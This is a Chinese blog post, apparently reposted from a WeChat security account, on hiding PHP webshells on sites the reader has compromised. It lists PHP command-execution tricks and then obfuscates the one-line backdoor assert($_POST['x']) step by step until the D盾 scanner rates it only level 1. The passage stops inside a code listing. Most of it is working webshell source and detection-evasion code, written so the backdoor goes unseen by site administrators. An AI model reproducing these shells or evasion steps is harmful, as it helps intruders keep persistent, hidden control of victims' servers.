<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>如何优雅的隐藏你的Webshell - zu1k</title><meta name=description content="A boy dreaming of traveling around the world.<br>This blog is used to record my study, thinking and life."><meta name=keywords content="zu1k,zuik,zu1k.com,网络安全,思考,逆向"><meta name=author content="zu1k"><meta property="og:title" content="如何优雅的隐藏你的Webshell"><meta property="og:description" content="转自：酒仙桥六号部队 https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug 这个公众号的文章质量都非常高，推荐大家关注 拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker"><meta property="og:type" content="article"><meta property="og:url" content="https://zu1k.com/posts/security/web-security/hide-your-webshell/"><meta property="og:image" content="https://zu1k.com/images/logo.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-08-08T09:21:59+08:00"><meta property="article:modified_time" content="2023-04-11T10:07:19+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zu1k.com/images/logo.jpg"><meta name=twitter:title content="如何优雅的隐藏你的Webshell"><meta name=twitter:description content="转自：酒仙桥六号部队 https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug 这个公众号的文章质量都非常高，推荐大家关注 拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker"><meta name=application-name content="zu1k"><meta name=apple-mobile-web-app-title content="zu1k"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><meta itemprop=name content="如何优雅的隐藏你的Webshell"><meta itemprop=description content="转自：酒仙桥六号部队 https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug 这个公众号的文章质量都非常高，推荐大家关注 拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker"><meta itemprop=datePublished content="2020-08-08T09:21:59+08:00"><meta itemprop=dateModified content="2023-04-11T10:07:19+08:00"><meta itemprop=wordCount content="3036"><meta itemprop=image content="https://zu1k.com/images/logo.jpg"><meta itemprop=keywords content="WebShell,"><link rel="shortcut icon" type=image/x-icon href=../../../../favicon.ico><link rel=icon type=image/png sizes=32x32 href=../../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../../favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=../../../../apple-touch-icon.png><link rel=mask-icon href=../../../../apple-touch-icon.png color=#5bbad5><link rel=manifest href=../../../../site.webmanifest><link rel=canonical href=https://zu1k.com/posts/security/web-security/hide-your-webshell/><link rel=prev href=https://zu1k.com/posts/coding/nali-golang/><link rel=next href=https://zu1k.com/posts/security/reverse/golang-reverse/><link rel=stylesheet href=../../../../lib/normalize/normalize.min.css><link rel=stylesheet href=../../../../css/style.min.css><link rel=stylesheet href=../../../../lib/icon/css/icon-embedded.css><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"如何优雅的隐藏你的Webshell","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/zu1k.com\/posts\/security\/web-security\/hide-your-webshell\/"},"image":[{"@type":"ImageObject","url":"https:\/\/zu1k.com\/images\/logo.jpg","width":256,"height":256}],"genre":"posts","keywords":"WebShell","wordcount":3036,"url":"https:\/\/zu1k.com\/posts\/security\/web-security\/hide-your-webshell\/","datePublished":"2020-08-08T09:21:59+08:00","dateModified":"2023-04-11T10:07:19+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"zu1k","logo":"https:\/\/zu1k.com\/images\/logo.jpg"},"author":{"@type":"Person","name":"zu1k"},"description":""}</script><script defer src=../../../../_vercel/insights/script.js></script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=../../../../ title=zu1k>zu1k</a></div><div class=menu><div class=menu-inner><a class=menu-item href=../../../../posts/>文章 </a><a class=menu-item href=../../../../categories/>分类 </a><a class=menu-item href=../../../../tags/>标签 </a><a class=menu-item href=../../../../projects/>项目 </a><a class=menu-item href=../../../../links/>友链 </a><a class=menu-item href=../../../../about/>关于 </a><a class=menu-item href=../../../../rss.xml title=RSS><i class=icon-rss></i> </a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class=icon-search></i></a>
<a class="search-button search-clear" id=search-clear-desktop title=清空><i class=icon-cancel-circled></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class=icon-spin2></i></span>
</span><a class="menu-item theme-switch" title=切换主题><i class=icon-adjust></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=../../../../ title=zu1k>zu1k</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class=icon-search></i></a>
<a class="search-button search-clear" id=search-clear-mobile title=清空><i class=icon-cancel-circled></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class=icon-spin2></i></span></div><a class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=../../../../posts/ title>文章</a><a class=menu-item href=../../../../categories/ title>分类</a><a class=menu-item href=../../../../tags/ title>标签</a><a class=menu-item href=../../../../projects/ title>项目</a><a class=menu-item href=../../../../links/ title>友链</a><a class=menu-item href=../../../../about/ title>关于</a><a class=menu-item href=../../../../rss.xml title=RSS><i class=icon-rss></i></a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i></a><a class="menu-item theme-switch" title=切换主题>
<i class=icon-adjust></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class=single-title>如何优雅的隐藏你的Webshell</h1><div class=post-meta><div class=post-meta-line>&nbsp;<span class=post-category>收录于 <a href=../../../../categories/web-security/><i class=icon-folder></i>Web 安全</a></span></div><div class=post-meta-line><i class=icon-calendar></i>&nbsp;<time datetime=2020-08-08>2020-08-08</time>&nbsp;<i class=icon-pencil></i>&nbsp;约 3036 字&nbsp;
<i class=icon-clock></i>&nbsp;阅读 7 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon icon-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#制作免杀webshell>制作免杀webshell</a><ul><li><a href=#命令执行的方法>命令执行的方法</a><ul><li><a href=#直接执行>直接执行</a></li><li><a href=#动态函数执行>动态函数执行</a></li><li><a href=#文件包含执行>文件包含执行</a></li></ul></li><li><a href=#回调函数>回调函数</a></li><li><a href=#php-curly-syntax>PHP Curly Syntax</a></li><li><a href=#php反序列化>php反序列化</a></li><li><a href=#phpinput方法>php://input方法</a></li><li><a href=#preg_replace方法>preg_replace方法</a></li><li><a href=#ob_start>ob_start</a></li></ul></li><li><a href=#编写免杀>编写免杀</a></li><li><a href=#更好的隐藏webshell一些建议>更好的隐藏webshell一些建议</a></li></ul></nav></div></div><div class=content id=content><blockquote><p>转自：酒仙桥六号部队 <a href=https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug target=_blank rel="noopener noreffer" class=post-link>https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>
这个公众号的文章质量都非常高，推荐大家关注</p></blockquote><p>拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：</p><h2 id=制作免杀webshell>制作免杀webshell</h2><p>隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。</p><h3 id=命令执行的方法>命令执行的方法</h3><p>这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法</p><h4 id=直接执行>直接执行</h4><p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=s1>&#39;echo 这是输出;&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_1_huec863fcd991b5a860115d0c8c96bde80_5855_662x287_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_1_huec863fcd991b5a860115d0c8c96bde80_5855_662x287_resize_q75_h2_box_3.webp title=直接执行></p><h4 id=动态函数执行>动态函数执行</h4><p>我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=s2>&#34;phpinfo&#34;</span><span class=p>;</span><span class=nv>$a</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_2_hud8157cb6d9106b602ec0932930b24243_52079_780x550_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_2_hud8157cb6d9106b602ec0932930b24243_52079_780x550_resize_q75_h2_box_3.webp title=动态函数执行></p><h4 id=文件包含执行>文件包含执行</h4><p>有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p><p>b.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=s1>&#39;echo 这是输出;&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>a.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=nx>a</span><span class=o>.</span><span class=nx>php</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_3_hu2c4d58ea186c37b1f1e5b25a8657d838_10945_498x270_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_3_hu2c4d58ea186c37b1f1e5b25a8657d838_10945_498x270_resize_q75_h2_box_3.webp title=文件包含执行></p><h3 id=回调函数>回调函数</h3><p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$func</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>array_map</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$arr</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_4_hueaa531329eca728081a84c07d452ef70_23161_641x339_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_4_hueaa531329eca728081a84c07d452ef70_23161_641x339_resize_q75_h2_box_3.webp title=回调函数></p><h3 id=php-curly-syntax>PHP Curly Syntax</h3><p>我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s1>&#39;p&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{</span><span class=nv>$a</span><span class=si>}</span><span class=s2>hpinfo();&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_5_hudcfd1c86d9ff9f14b24e2faec4f797e4_54254_858x497_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_5_hudcfd1c86d9ff9f14b24e2faec4f797e4_54254_858x497_resize_q75_h2_box_3.webp title=Syntax></p><h3 id=php反序列化>php反序列化</h3><p>这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=o>=</span><span class=s2>&#34;123&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=s1>&#39;O:4:&#34;test&#34;:1:{s:1:&#34;a&#34;;s:10:&#34;phpinfo();&#34;;}&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_6_hue52bdce1b600a1d8b0407ac4def148f1_42914_812x537_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_6_hue52bdce1b600a1d8b0407ac4def148f1_42914_812x537_resize_q75_h2_box_3.webp title=php反序列化></p><h3 id=phpinput方法>php://input方法</h3><p>php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_7_hua8d9397dcecd727e09eafc004016d4c0_186907_1080x586_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_7_hua8d9397dcecd727e09eafc004016d4c0_186907_1080x586_resize_q75_h2_box_3.webp title=php://input方法></p><h3 id=preg_replace方法>preg_replace方法</h3><p>preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/test/e&#34;</span><span class=p>,</span><span class=nx>phpinfo</span><span class=p>(),</span><span class=s2>&#34;jutst test&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_8_hu2bcc87098c6bbdd36c27901ba3c08e7f_53111_936x502_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_8_hu2bcc87098c6bbdd36c27901ba3c08e7f_53111_936x502_resize_q75_h2_box_3.webp title=preg_replace方法></p><h3 id=ob_start>ob_start</h3><p>ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>ob_start</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>ob_end_flush</span><span class=p>();</span><span class=c1>//输出全部内容到浏览器
</span></span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_9_hu8b212336840fc1c0d957a1964b8cb0f7_21740_714x326_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_9_hu8b212336840fc1c0d957a1964b8cb0f7_21740_714x326_resize_q75_h2_box_3.webp title=ob_start></p><h2 id=编写免杀>编写免杀</h2><p>上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>assert</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_10_hu2afc3390c23b7b6f7590d3d1d6f0dd3f_29786_844x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_10_hu2afc3390c23b7b6f7590d3d1d6f0dd3f_29786_844x581_resize_q75_h2_box_3.webp title=5级></p><p>这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。</p><p>动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=s2>&#34;assert&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_11_hu3e5f8c092f0b7d4c0b94c8dfe8c50c65_30259_844x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_11_hu3e5f8c092f0b7d4c0b94c8dfe8c50c65_30259_844x581_resize_q75_h2_box_3.webp title=4级></p><p>回调函数方法，把assert函数当作参数传给array_map去调用执行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$fun</span> <span class=o>=</span> <span class=s1>&#39;assert&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>array_map</span><span class=p>(</span><span class=nv>$fun</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>]));</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_12_hu99b5d973ac06bbc3e0ff9685aa3102bb_30165_845x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_12_hu99b5d973ac06bbc3e0ff9685aa3102bb_30165_845x581_resize_q75_h2_box_3.webp title=4级></p><p>可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的</p><p>通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;assert&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$$c</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_13_hu6a3e1c51c2e0c295fdc6e85265639084_30221_844x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_13_hu6a3e1c51c2e0c295fdc6e85265639084_30221_844x581_resize_q75_h2_box_3.webp title=3级></p><p>我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$fun</span> <span class=o>=</span> <span class=s1>&#39;assert&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s1>&#39;fun&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>array_map</span><span class=p>(</span><span class=nv>$$f</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>]));</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_14_hub50b6884ea01b7a46090001d79a243b0_30197_845x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_14_hub50b6884ea01b7a46090001d79a243b0_30197_845x581_resize_q75_h2_box_3.webp title=2级></p><p>这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>ass</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;a451.ass.aaa.ert.adaww&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$b</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$b</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>.</span> <span class=nv>$b</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nx>ass</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>array_map</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span><span class=nv>$b</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_15_hue00e5697a33a14d7a10038f6bed474fb_30324_844x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_15_hue00e5697a33a14d7a10038f6bed474fb_30324_844x581_resize_q75_h2_box_3.webp title=1级></p><p>1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
